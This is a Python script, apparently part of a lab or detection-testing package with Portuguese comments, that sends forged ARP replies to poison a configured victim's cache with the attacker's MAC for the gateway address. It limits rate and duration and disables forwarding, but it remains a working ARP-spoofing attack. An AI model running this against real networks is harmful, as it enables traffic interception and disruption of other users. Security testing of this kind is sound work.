"""Envenenamento ARP unidirecional, limitado ao laboratório configurado.

Não contém forwarding, descoberta de alvos, restauração por ARP forjado ou
qualquer envio a interfaces/destinos derivados de dados da rede.
"""
import argparse
from math import isfinite
from threading import Event
from time import monotonic
import signal
from netsentinel.security.config import load_config
from netsentinel.security.system import LinuxSystem, preflight


def poison_packet(config):
    # Import local: permitir validar configuração antes de carregar captura Scapy.
    from scapy.layers.l2 import Ether, ARP
    return (Ether(src=config.attacker_mac, dst=config.victim_mac) /
            ARP(op=2, hwsrc=config.attacker_mac, psrc=config.gateway_ip,
                hwdst=config.victim_mac, pdst=config.victim_ip))


def run_attack(config, pps, seconds, stop, system, sender=None, clock=monotonic):
    if not isfinite(pps) or not 0 < pps <= 50:
        raise ValueError('Use 0 < pps <= 50 para o ensaio limitado.')
    if not isfinite(seconds) or not 0 < seconds <= 300:
        raise ValueError('Use duração positiva de até 300 segundos.')
    preflight(config, 'attacker', system)
    if sender is None:
        from scapy.sendrecv import sendp
        sender = sendp
    packet = poison_packet(config)
    started = clock()
    last_check = started
    count = 0
    while not stop.is_set() and clock() - started < seconds:
        now = clock()
        if now - last_check >= 1:
            preflight(config, 'attacker', system)
            last_check = now
        sender(packet, iface=config.interface, verbose=False)
        count += 1
        # Sem rajadas para compensar atraso; carga pode ficar abaixo do solicitado.
        stop.wait(min(1 / pps, max(0, seconds - (clock() - started))))
    return count


def main():
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument('--config', required=True)
    parser.add_argument('--pps', required=True, type=float)
    parser.add_argument('--seconds', required=True, type=float)
    args = parser.parse_args()
    stop = Event()
    signal.signal(signal.SIGINT, lambda *_: stop.set())
    signal.signal(signal.SIGTERM, lambda *_: stop.set())
    count = run_attack(load_config(args.config), args.pps, args.seconds, stop, LinuxSystem())
    print(f'Ensaio encerrado: {count} anúncios enviados; nenhum encaminhamento foi habilitado.')


if __name__ == '__main__':
    main()
